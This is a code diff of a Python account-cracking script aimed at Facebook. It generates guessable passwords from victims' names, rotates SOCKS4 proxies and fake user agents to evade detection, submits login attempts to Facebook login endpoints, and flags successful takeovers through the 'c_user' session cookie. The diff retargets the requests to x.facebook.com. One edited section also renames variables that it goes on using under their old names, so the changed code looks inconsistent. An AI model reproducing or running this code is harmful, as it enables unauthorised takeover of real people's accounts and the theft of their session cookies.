@@ -540,10 +540,10 @@ def ffb(ids,names,passlist):
 			nip=random.choice(prox)
 			proxs= {'http': 'socks4://'+nip}
 			
-			head = {'Host': 'p.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="24", "Chromium";v="107", "Google Chrome";v="107"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Andriod"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?0', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-PK,en-US,en;q=0.9,en;q=0.8,en;q=0.7'}
-			getlog = session.get(f'https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
+			head = {'Host': 'x.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="24", "Chromium";v="107", "Google Chrome";v="107"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Andriod"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?0', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-PK,en-US,en;q=0.9,en;q=0.8,en;q=0.7'}
+			getlog = session.get(f'https://x.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
 			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
-			complete = session.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head,proxies=proxs)
+			complete = session.post('https://x.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head,proxies=proxs)
 			AXI=session.cookies.get_dict().keys()
 			if "c_user" in AXI:
 				coki=session.cookies.get_dict()
@@ -606,7 +606,7 @@ def gmail():
                         print("\033[1;37m \x1b[38;5;208mUse flight mode for speed up\033[1;37m")
                         linex()
                         for user in fo:
-                                ids,names = user.split('|')
+                                uid,names = user.split('|')
                                 first_name = names.rsplit(' ')[0]
                                 try:
                                         last_name = names.rsplit(' ')[1]
@@ -614,11 +614,11 @@ def gmail():
                                         last_name = 'Khan'
                                 fs = first_name.lower()
                                 ls = last_name.lower()
-                                passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12']
+                                pwx = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12']
                                 if mthd in ['1','01']:	
                                 	yaari.submit(mm,ids,passlist)
                                 elif mthd in ['2','02']:
-                                    yaari.submit(mmm,ids,names,passlist)
+                                    yaari.submit(fcrack,uid,pwx,tl)
                                 else:
                                     yaari.submit(mmmm,ids,names,passlist)
                 print('\033[1;37m')
@@ -893,7 +893,7 @@ def fcrack(uid,pwx,tl):
 			ua = random.choice(ugen)
 			nip=random.choice(prox)
 			proxs= {'http': 'socks4://'+nip}
-			free_fb = session.get('https://free.facebook.com').text
+			free_fb = session.get('https://x.facebook.com').text
 			log_data = {
 				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
 			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -904,7 +904,7 @@ def fcrack(uid,pwx,tl):
 			"email":uid,
 			"pass":ps,
 			"login":"Log In"}
-			header_freefb = {'authority':'mbasic.facebook.com',
+			header_freefb = {'authority':'x.facebook.com',
 			'upgrade-insecure-requests': '1',
 			'viewport-width': '1080',
 			'method': 'GET',
